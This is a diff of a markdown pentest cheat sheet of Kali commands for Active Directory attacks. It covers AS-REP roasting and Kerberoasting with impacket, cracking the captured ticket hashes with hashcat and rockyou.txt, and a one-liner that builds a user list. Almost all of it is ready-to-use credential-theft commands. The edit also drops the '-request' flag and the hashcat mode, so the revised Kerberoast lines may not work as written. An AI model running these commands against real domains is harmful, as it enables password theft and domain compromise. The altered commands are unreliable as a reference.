@@ -5,14 +5,16 @@
 ### Kali Commands
 
 ```bash
-# Kerberoast
-impacket-GetUserSPNs -request -dc-ip $IP -outputfile hashes.kerberoast $DOMAIN/$USER:$PASS
-impacket-GetUserSPNs -request -dc-ip $IP -outputfile hashes.kerberoast $DOMAIN/$USER -hashes ':$NTLM'
-hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force
-
 # AS-REP roast
-impacket-GetNPUsers -request -dc-ip $IP -outputfile hashes.asreproast $DOMAIN/$USER
+impacket-GetNPUsers -request -dc-ip $IP -outputfile hashes.asreproast $DOMAIN/
 hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force
+
+# Kerberoast
+impacket-GetUserSPNs -dc-ip $IP -outputfile hashes.kerberoast $DOMAIN/$USER:$PASS
+impacket-GetUserSPNs -dc-ip $IP -outputfile hashes.kerberoast $DOMAIN/$USER -hashes ':$NTLM'
+hashcat hashes.kerberoast /usr/share/wordlists/rockyou.txt --force
+
+
 
 # Convert net user output to user list
 tr -s ' ' '\n' < users.txt | sed '/^$/d'
